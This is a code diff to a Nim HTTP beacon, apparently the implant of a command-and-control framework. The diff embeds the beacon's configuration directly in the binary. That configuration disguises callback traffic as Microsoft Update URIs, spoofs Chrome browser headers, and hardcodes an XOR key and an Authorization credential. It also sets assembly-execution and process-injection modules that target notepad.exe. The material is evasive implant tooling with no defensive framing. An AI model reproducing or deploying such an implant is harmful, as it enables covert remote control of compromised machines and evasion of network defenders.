@@ -10,6 +10,74 @@ import std/random
 import Beacon
 
 
+const configJson = r"""
+{
+    "DomainName": "",
+    "ExposedIp": "",
+    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
+    "ListenerHttpConfig": {
+        "uri": [
+            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
+        ],
+        "client": {
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+                "Connection": "Keep-Alive",
+                "Content-Type": "text/plain;charset=UTF-8",
+                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
+                "Keep-Alive": "timeout=5, max=1000",
+                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
+                "Accept": "*/*",
+                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
+                "Sec-Ch-Ua-Platform": "Windows"
+            }
+        }
+    },
+    "ListenerHttpsConfig": {
+        "uri": [
+            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
+        ],
+        "client": {
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+                "Connection": "Keep-Alive",
+                "Content-Type": "text/plain;charset=UTF-8",
+                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
+                "Keep-Alive": "timeout=5, max=1000",
+                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
+                "Accept": "*/*",
+                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
+                "Sec-Ch-Ua-Platform": "Windows"
+            }
+        }
+    },
+    "ModulesConfig": {
+        "assemblyExec": {
+            "process": "notepad.exe",
+            "test": "test"
+        },
+        "inject": {
+            "process": "notepad.exe",
+            "test": "test"
+        },
+        "toto": {
+            "process": "test",
+            "test": "test"
+        }
+    }
+}
+"""
+
+proc loadConfigFromConst(): JsonNode =
+  result = parseJson(configJson)
+
+
 type
   BeaconHttp* = ref object of Beacon
     host: string
@@ -21,12 +89,8 @@ type
     configPath: string
 
 
-proc loadConfig(self: BeaconHttp, path: string) =
-  var configJson: JsonNode
-  try:
-    configJson = parseFile(path)
-  except CatchableError:
-    return
+proc loadConfig(self: BeaconHttp) =
+  let configJson = loadConfigFromConst()
 
   if configJson.hasKey("xorKey"):
     self.xorKey = configJson["xorKey"].getStr()
@@ -55,10 +119,9 @@ proc loadConfig(self: BeaconHttp, path: string) =
             self.headers[k] = v.getStr()
 
 
-proc initBeaconHttp*(self: BeaconHttp, baseUrl, port: string, configPath = "BeaconConfig.json") =
+proc initBeaconHttp*(self: BeaconHttp, baseUrl, port: string) =
   self.initBeacon()
   self.port = port
-  self.configPath = configPath
 
   let parsed = parseUri(baseUrl)
   var scheme = parsed.scheme
@@ -73,7 +136,7 @@ proc initBeaconHttp*(self: BeaconHttp, baseUrl, port: string, configPath = "Beac
   self.endpoints = @[]
   self.headers = initTable[string, string]()
 
-  self.loadConfig(configPath)
+  self.loadConfig()
 
   if self.endpoints.len == 0:
     self.endpoints = @[parsed.path]
